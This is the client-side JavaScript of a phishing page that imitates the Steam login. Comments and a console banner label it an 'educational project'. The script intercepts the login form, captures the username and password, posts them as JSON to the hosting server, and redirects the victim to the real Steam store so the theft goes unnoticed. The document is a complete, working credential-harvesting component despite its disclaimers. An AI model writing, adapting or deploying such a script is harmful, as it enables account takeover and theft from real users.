// ОБРАЗОВАТЕЛЬНЫЙ ПРОЕКТ: НЕ ДЛЯ РЕАЛЬНОГО ИСПОЛЬЗОВАНИЯ
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            // Prevent the default form submission
            event.preventDefault();
            
            // Get form data
            const formData = new FormData(loginForm);
            const username = formData.get('username');
            const password = formData.get('password');
            const remember = formData.get('remember') ? true : false;
            
            // Log the captured credentials (for educational purposes only)
            console.log('Captured credentials (EDUCATIONAL DEMO ONLY):');
            console.log('Username:', username);
            console.log('Password:', password);
            console.log('Remember me:', remember);
            
            // Send data to our local server
            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username,
                    password,
                    remember
                }),
            })
            .then(response => {
                // After successful submission, redirect to the real Steam site
                window.location.href = 'https://store.steampowered.com/';
            })
            .catch(error => {
                console.error('Error:', error);
                // Still redirect even if there's an error
                window.location.href = 'https://store.steampowered.com/';
            });
        });
    }
    
    // Display educational warning
    console.warn(
        '%c⚠️ EDUCATIONAL PROJECT ONLY ⚠️\n' +
        'This is a demonstration of how phishing attacks work.\n' +
        'Using such techniques for malicious purposes is illegal and unethical.\n' +
        'This project is for educational purposes only.',
        'color: red; font-size: 20px; font-weight: bold;'
    );
}); 